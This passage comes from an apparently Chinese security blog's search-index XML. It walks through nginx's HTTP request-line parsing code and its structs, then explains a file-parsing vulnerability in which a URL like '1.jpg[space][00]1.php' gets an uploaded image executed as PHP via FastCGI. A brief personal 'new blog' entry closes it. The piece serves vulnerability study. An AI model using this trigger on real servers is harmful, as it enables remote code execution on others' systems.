class="line"></div><div class="line"><span class="comment">/* URI with "+" */</span></div><div class="line"><span class="keyword">unsigned</span>                          plus_in_uri:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">/* URI with " " */</span></div><div class="line"><span class="keyword">unsigned</span>                          space_in_uri:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          invalid_header:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          add_uri_to_alias:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          valid_location:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          valid_unparsed_uri:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          uri_changed:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          uri_changes:<span class="number">4</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          request_body_in_single_buf:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          request_body_in_file_only:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          request_body_in_persistent_file:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          request_body_in_clean_file:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          request_body_file_group_access:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          request_body_file_log_level:<span class="number">3</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          subrequest_in_memory:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          waited:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> (NGX_HTTP_CACHE)</span></div><div class="line"><span class="keyword">unsigned</span>                          cached:<span class="number">1</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> (NGX_HTTP_GZIP)</span></div><div class="line"><span class="keyword">unsigned</span>                          gzip_tested:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          gzip_ok:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          gzip_vary:<span class="number">1</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          proxy:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          bypass_cache:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          no_cache:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">* instead of using the request context data in</span></div><div class="line"><span class="comment">* ngx_http_limit_conn_module and ngx_http_limit_req_module</span></div><div class="line"><span class="comment">* we use the single bits in the request structure</span></div><div class="line"><span class="comment">*/</span></div><div class="line"><span class="keyword">unsigned</span>                          limit_conn_set:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          limit_req_set:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></div><div class="line"><span class="keyword">unsigned</span>                          cacheable:<span class="number">1</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          pipeline:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          chunked:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          header_only:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          keepalive:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          lingering_close:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          discard_body:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          internal:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          error_page:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          ignore_content_encoding:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          filter_finalize:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          post_action:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          request_complete:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          request_output:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          header_sent:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          expect_tested:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          root_tested:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          done:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          logged:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          buffered:<span class="number">4</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          main_filter_need_in_memory:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          filter_need_in_memory:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          filter_need_temporary:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          allow_ranges:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> (NGX_STAT_STUB)</span></div><div class="line"><span class="keyword">unsigned</span>                          stat_reading:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>                          stat_writing:<span class="number">1</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="comment">/* used to parse HTTP headers */</span></div><div class="line"></div><div class="line"><span class="keyword">ngx_uint_t</span>                        state;</div><div class="line"></div><div class="line"><span class="keyword">ngx_uint_t</span>                        header_hash;</div><div class="line"><span class="keyword">ngx_uint_t</span>                        lowcase_index;</div><div class="line">u_char                            lowcase_header[NGX_HTTP_LC_HEADER_LEN];</div><div class="line"></div><div class="line">u_char                           *header_name_start;</div><div class="line">u_char                           *header_name_end;</div><div class="line">u_char                           *header_start;</div><div class="line">u_char                           *header_end;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">* a memory that can be reused after parsing a request line</span></div><div class="line"><span class="comment">* via ngx_http_ephemeral_t</span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line">u_char                           *uri_start;</div><div class="line">u_char                           *uri_end;</div><div class="line">u_char                           *uri_ext;</div><div class="line">u_char                           *args_start;</div><div class="line">u_char                           *request_start;</div><div class="line">u_char                           *request_end;</div><div class="line">u_char                           *method_end;</div><div class="line">u_char                           *schema_start;</div><div class="line">u_char                           *schema_end;</div><div class="line">u_char                           *host_start;</div><div class="line">u_char                           *host_end;</div><div class="line">u_char                           *port_start;</div><div class="line">u_char                           *port_end;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          http_minor:<span class="number">16</span>;</div><div class="line"><span class="keyword">unsigned</span>                          http_major:<span class="number">16</span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我们接下来再看一下ngx_buf_t类的结构成员</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ngx_buf_s</span>  <span class="title">ngx_buf_t</span>;</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ngx_buf_s</span> &#123;</span></div><div class="line">u_char          *pos;</div><div class="line">u_char          *last;</div><div class="line"><span class="keyword">off_t</span>            file_pos;</div><div class="line"><span class="keyword">off_t</span>            file_last;</div><div class="line"></div><div class="line">u_char          *start;         <span class="comment">/* start of buffer */</span></div><div class="line">u_char          *end;           <span class="comment">/* end of buffer */</span></div><div class="line"><span class="keyword">ngx_buf_tag_t</span>    tag;</div><div class="line"><span class="keyword">ngx_file_t</span>      *file;</div><div class="line"><span class="keyword">ngx_buf_t</span>       *shadow;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* the buf's content could be changed */</span></div><div class="line"><span class="keyword">unsigned</span>         temporary:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">* the buf's content is in a memory cache or in a read only memory</span></div><div class="line"><span class="comment">* and must not be changed</span></div><div class="line"><span class="comment">*/</span></div><div class="line"><span class="keyword">unsigned</span>         memory:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">/* the buf's content is mmap()ed and must not be changed */</span></div><div class="line"><span class="keyword">unsigned</span>         mmap:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>         recycled:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>         in_file:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>         flush:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>         sync:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>         last_buf:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>         last_in_chain:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>         last_shadow:<span class="number">1</span>;</div><div class="line"><span class="keyword">unsigned</span>         temp_file:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">/* STUB */</span> <span class="keyword">int</span>   num;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>结构成员名字的含义：</p>
<table>
<thead>
<tr>
<th>pos:</th>
<th style="text-align:center">当buf所指向的数据在内存里的时候，pos指向的是这段数据开始的位置。</th>
</tr>
</thead>
<tbody>
<tr>
<td>last:</td>
<td style="text-align:center">当buf所指向的数据在内存里的时候，last指向的是这段数据结束的位置。</td>
</tr>
<tr>
<td>file_pos:</td>
<td style="text-align:center">当buf所指向的数据是在文件里的时候，file_pos指向的是这段数据的开始位置在文件中的偏移量。</td>
</tr>
<tr>
<td>file_last:</td>
<td style="text-align:center">当buf所指向的数据是在文件里的时候，file_last指向的是这段数据的结束位置在文件中的偏移量。</td>
</tr>
<tr>
<td>start:</td>
<td style="text-align:center">当buf所指向的数据在内存里的时候，这一整块内存包含的内容可能被包含在多个buf中(比如在某段数据中间插入了其他的数据，这一块数据就需要被拆分开)。那么这些buf中的start和end都指向这一块内存的开始地址和结束地址。而pos和last指向本buf所实际包含的数据的开始和结尾。</td>
</tr>
<tr>
<td>end:</td>
<td style="text-align:center">解释参见start。</td>
</tr>
<tr>
<td>tag:</td>
<td style="text-align:center">实际上是一个void*类型的指针，使用者可以关联任意的对象上去，只要对使用者有意义。</td>
</tr>
<tr>
<td>file:</td>
<td style="text-align:center">当buf所包含的内容在文件中时，file字段指向对应的文件对象。</td>
</tr>
<tr>
<td>shadow:</td>
<td style="text-align:center">当这个buf完整copy了另外一个buf的所有字段的时候，那么这两个buf指向的实际上是同一块内存，或者是同一个文件的同一部分，此时这两个buf的shadow字段都是指向对方的。那么对于这样的两个buf，在释放的时候，就需要使用者特别小心，具体是由哪里释放，要提前考虑好，如果造成资源的多次释放，可能会造成程序崩溃！</td>
</tr>
<tr>
<td>temporary:</td>
<td style="text-align:center">为1时表示该buf所包含的内容是在一个用户创建的内存块中，并且可以被在filter处理的过程中进行变更，而不会造成问题。</td>
</tr>
<tr>
<td>memory:</td>
<td style="text-align:center">为1时表示该buf所包含的内容是在内存中，但是这些内容却不能被进行处理的filter进行变更。</td>
</tr>
<tr>
<td>mmap:</td>
<td style="text-align:center">为1时表示该buf所包含的内容是在内存中, 是通过mmap使用内存映射从文件中映射到内存中的，这些内容却不能被进行处理的filter进行变更。</td>
</tr>
<tr>
<td>recycled:</td>
<td style="text-align:center">可以回收的。也就是这个buf是可以被释放的。这个字段通常是配合shadow字段一起使用的，对于使用ngx_create_temp_buf 函数创建的buf，并且是另外一个buf的shadow，那么可以使用这个字段来标示这个buf是可以被释放的。</td>
</tr>
<tr>
<td>in_file:</td>
<td style="text-align:center">为1时表示该buf所包含的内容是在文件中。</td>
</tr>
<tr>
<td>flush:</td>
<td style="text-align:center">遇到有flush字段被设置为1的的buf的chain，则该chain的数据即便不是最后结束的数据（last_buf被设置，标志所有要输出的内容都完了），也会进行输出，不会受postpone_output配置的限制，但是会受到发送速率等其他条件的限制。</td>
</tr>
<tr>
<td>sync:</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td>last_buf:</td>
<td style="text-align:center">数据被以多个chain传递给了过滤器，此字段为1表明这是最后一个buf。</td>
</tr>
<tr>
<td>last_in_chain:</td>
<td style="text-align:center">在当前的chain里面，此buf是最后一个。特别要注意的是last_in_chain的buf不一定是last_buf，但是last_buf的buf一定是last_in_chain的。这是因为数据会被以多个chain传递给某个filter模块。</td>
</tr>
<tr>
<td>last_shadow:</td>
<td style="text-align:center">在创建一个buf的shadow的时候，通常将新创建的一个buf的last_shadow置为1。</td>
</tr>
<tr>
<td>temp_file:</td>
<td style="text-align:center">由于受到内存使用的限制，有时候一些buf的内容需要被写到磁盘上的临时文件中去，那么这时，就设置此标志 。</td>
</tr>
</tbody>
</table>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">line：<span class="number">109</span></div><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">sw_start = <span class="number">0</span>,</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>定义了一个状态机，通过state的值来确定处理步骤。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">line：139 state = r-&gt;state;</div></pre></td></tr></table></figure>
<p>state被赋值为r-&gt;state，r-&gt;state的类型为ngx_uint_t，ngx_uint_t类型是在以下文件中声明的</p>
<p>文件：_src/core/ngx<em>config.h</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">uintptr_t</span>       <span class="keyword">ngx_uint_t</span>;</div></pre></td></tr></table></figure>
<p>而uintptr_t类型的话，在Mac OS X中是在</p>
<p><code>_/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk/usr/include/sys/_types/_uintptr_t.h_</code></p>
<p>中被声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span>        <span class="keyword">uintptr_t</span>;</div></pre></td></tr></table></figure>
<p>可以看出uintptr_t类型实际上就是一个unsigned long类型，在<strong>《深入分析Linux内核源码》</strong>中的原因描述是这样的，</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">尽管在混合不同数据类型时你必须小心, 有时有很好的理由这样做. 一种情况是因为内存存取, 与内核相关时是特殊的. 概念上, 尽管地址是指针, 内存管理常常使用一个无符号的整数类型更好地完成; 内核对待物理内存如同一个大数组, 并且内存地址只是一个数组索引. 进一步地, 一个指针容易解引用; 当直接处理内存存取时, 你几乎从不想以这种方式解引用. 使用一个整数类型避免了这种解引用, 因此避免了 bug. 因此, 内核中通常的内存地址常常是 unsigned long, 利用了指针和长整型一直是相同大小的这个事实, 至少在 Linux 目前支持的所有平台上.</div><div class="line"></div><div class="line">因为其所值的原因, C99 标准定义了 intptr<span class="emphasis">_t 和 uintptr_</span>t 类型给一个可以持有一个指针值的整型变量. 但是, 这些类型几乎没在 2.6 内核中使用</div></pre></td></tr></table></figure>
<p>进行验证：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> a;</div><div class="line"><span class="keyword">int</span> *b;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%d %d"</span>, <span class="keyword">sizeof</span>(a), <span class="keyword">sizeof</span>(b));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">8</span> <span class="number">8</span></div><div class="line">Process finished with <span class="built_in">exit</span> code <span class="number">0</span></div></pre></td></tr></table></figure>
<p>​    接下来进入了for循环里面，for循环里面的p的开始和结束分别为buff在内存中的开始(pos)和结束(last)。b-&gt;pos和b-&gt;last的类型是u_char,u<em>char是在MacOSX在</em>/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk/usr/include/sys/types.h_中定义的。<br>​<br>​    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">​    line：84 typedef unsigned char     u_char;</div><div class="line">​</div></pre></td></tr></table></figure></p>
<p>​<br>​    所以pos和last分别储存了buff开始和结束的unsigned类型的两个字符。<br>​<br>​    <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">​    line：<span class="number">141</span> <span class="keyword">for</span> (p = b-&gt;pos; p &lt; b-&gt;last; p++)&#123;...&#125;</div><div class="line">​</div></pre></td></tr></table></figure></p>
<p>​<br>​    接着使用了一个for循环来控制指针的移动，ch为当前指针指向的字符。r-&gt;state的值为0<br>​<br>​    ，所以第一次进入状态机进入了sw_start，如果第一个字符是CR（回车）或者LF（换行）就break，接下去再把指针p向后移动直到碰到非LF和CR，再进入下一个判断语句<br>​<br>​    <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">​    <span class="keyword">if</span> ((ch &lt; <span class="string">'A'</span> || ch &gt; <span class="string">'Z'</span>) &amp;&amp; ch != <span class="string">'_'</span>) &#123;</div><div class="line">​    <span class="keyword">return</span> NGX_HTTP_PARSE_INVALID_METHOD;</div><div class="line">​    &#125;</div><div class="line">​</div></pre></td></tr></table></figure></p>
<p>​<br>​    遇到A-Z和_之外的字符都返回一个解析错误。通过了这两项检查，会向后移动直到遇到一个空格，会进入method的判断，开发人员先判断了遇到的第一个空格之前字符的数量，根据数量再进入相应的case中去判断是什么method然后再将r-&gt;method设置为相应的method。<br>​<br>​    完成了以上对HTTP method的判断之后，进入了第二个判断sw_spaces_before_uri，<br>​<br>​    <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">​    <span class="keyword">switch</span> (ch) &#123;</div><div class="line">​    <span class="keyword">case</span> <span class="string">' '</span>:</div><div class="line">​    <span class="keyword">break</span>;</div><div class="line">​    <span class="keyword">default</span>:</div><div class="line">​    <span class="keyword">return</span> NGX_HTTP_PARSE_INVALID_REQUEST;</div><div class="line">​    &#125;</div><div class="line">​</div></pre></td></tr></table></figure></p>
<p>​<br>​    这一段我们可以看出，只要遇到空格（space）指针就会就会往后移动，直到遇到’/‘或者遇到字符A-Z。<br>​<br>​    <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">​    c = (u_char) (ch | <span class="number">0x20</span>);</div><div class="line">​    <span class="keyword">if</span> (c &gt;= <span class="string">'a'</span> &amp;&amp; c &lt;= <span class="string">'z'</span>) &#123;</div><div class="line">​    r-&gt;schema_start = p;</div><div class="line">​    state = sw_schema;</div><div class="line">​    <span class="keyword">break</span>;</div><div class="line">​    &#125;</div><div class="line">​</div></pre></td></tr></table></figure></p>
<p>​<br>​    代码就是判断是否是sw_host_start，不是sw_host_start就判别为uri的开始，如果在<code>:</code>后碰到两个<code>/</code>并且如果<code>[</code>就进行ipv6的判断。<br>​<br>​    文字看起来没有图像直观，以下是解析的流程图<img src="/old/2017/10/10/Nginx-HTTP-Parse-Vulnerability/1509484404.png" alt="nginx_http0.png"><br>​<br>​    在sw_uri之后放置空格，case会进入sw_check_uri_http_09，这时候uri_ext和uri_end之间的值为Nginx判断的后缀，即如果让nginx解析的是以下的连接<br>​<br>​    <code>http://www.Johnis.online/1.jpg[空格][零零]1.php</code><br>​<br>​    那么nginx会判定为<code>jpg</code>，到了case <code>sw_check_uri_http_09</code>中，遇到/00并不会进行处理,会使用default条件<br>​<br>​    <img src="/old/2017/10/10/Nginx-HTTP-Parse-Vulnerability/2972208958.png" alt="nginx_http_1.png"><br>​<br>​    <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">​    <span class="keyword">default</span>:</div><div class="line">​    r-&gt;space_in_uri = <span class="number">1</span>;</div><div class="line">​    state = sw_check_uri;</div><div class="line">​    <span class="keyword">break</span>;</div><div class="line">​</div></pre></td></tr></table></figure></p>
<p>​<br>​    <img src="/old/2017/10/10/Nginx-HTTP-Parse-Vulnerability/1509484404.png" alt="nginx_gdb_1.png"><br>​<br>​    成功的没有让nginx对/00进行处理。<br>​<br>​    而后面.php成功的将<code>uri_ext</code>覆盖为了<code>php</code>，之后 nginx 就会将请求发送给 <code>fastcgi</code> 去解析，<code>fastcgi</code>查找文件会被00阻断［这里代码找不到，留个坑］，于是漏洞就形成了。<br>​<br>​    <img src="/old/2017/10/10/Nginx-HTTP-Parse-Vulnerability/2565879554.png" alt="nginx_burp.png"><br>​<br>​    注意点就是jpg文件上传的时候必须带一个空格，触发的时候空格后面加一个00跟上.php就能触发了［security.limit_extensions没有限制的情况下］<br>​<br>​    Reference:<br>​<br>​    <a href="http://tengine.taobao.org/book/" target="_blank" rel="external">taobao,(2013)._nginx开发从入门到精通</a><br>​<br>​    <a href="http://blog.csdn.net/liujiyong7/article/details/44833475" target="_blank" rel="external">囧囧有神,(2015)._nginx源码分析之http解码实现</a></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> Nginx </tag>
            
            <tag> 解析漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[新博客,新旅程]]></title>
      <url>/2017/10/10/%E6%96%B0%E5%8D%9A%E5%AE%A2-%E6%96%B0%E6%97%85%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h2 id="A-New-Journey"><a href="#A-New-Journey" class="headerlink" title="A New Journey"></a>A New Journey</h2><p>又一段新旅程，新的开始。</p>
<p>人生天地之间，若白驹过隙，忽然而已。</p>
]]></content>
      
        <categories>
            
            <category> essay </category>
            
        </categories>
        
        
        <tags>
            
            <tag> essay </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
